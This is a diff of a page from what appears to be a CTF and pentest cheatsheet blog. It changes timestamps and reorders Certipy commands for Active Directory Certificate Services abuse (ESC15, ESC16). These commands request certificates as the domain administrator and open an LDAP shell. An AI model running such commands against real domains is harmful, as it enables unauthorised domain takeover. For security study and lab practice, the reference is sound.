@@ -7,7 +7,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F55bd30fb-924f-4b62-8c2d-8ef5b2b0bc34%2Fcat.png?table=block&id=35840b9b-8958-455b-83ed-312be6e09422&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2">
 <meta property="article:published_time" content="2024-06-26T15:42:13.000Z">
-<meta property="article:modified_time" content="2025-06-09T13:57:42.992Z">
+<meta property="article:modified_time" content="2025-06-09T15:02:51.680Z">
 <meta property="article:author" content="serioton">
 <meta property="article:tag" content="ctf,writeups,vulnlab,hackthebox,htb,thm,cheatsheet">
 <meta name="twitter:card" content="summary">
@@ -57,7 +57,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2025-06-09 13:57:42'
+  postUpdate: '2025-06-09 15:02:51'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -228,12 +228,12 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy account update -u owned_user -p password -user username -upn username@domain -dc-ip ip</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx pfx -dc-ip ip -user target -domain domain</span><br></pre></td></tr></table></figure>
 <h2 id="ESC15"><a href="#ESC15" class="headerlink" title="ESC15"></a>ESC15</h2><p>Method 1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template template -upn administrator@domain -sid &lt;administrator sid&gt; -application-policies &#x27;Client Authentication&#x27;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip ip -ldap-shell</span><br></pre></td></tr></table></figure>
-<p>Method 2</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u username@domain -p password -dc-ip ip -ca ca -template WebServer -application-policies &#x27;Certificate Request Agent&#x27;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u username@domain -p password -dc-ip ip -ca ca -template User -pfx user.pfx -on-behalf-of &#x27;DOMAIN\Administrator&#x27;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip ip</span><br></pre></td></tr></table></figure>
+<p>Method 2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template template -upn administrator@domain -sid &lt;administrator sid&gt; -application-policies &#x27;Client Authentication&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip ip -ldap-shell</span><br></pre></td></tr></table></figure>
 <h2 id="ESC16"><a href="#ESC16" class="headerlink" title="ESC16"></a>ESC16</h2><p>We use a user that has GenericAll or GenericWrite</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy account -u username@domain -p password -dc-ip ip -upn administrator -user owned_user update</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u owned_user@domain -p password -dc-ip ip -target dc -ca ca -template User -upn administrator@domain -sid &lt;administrator sid&gt;</span><br></pre></td></tr></table></figure>
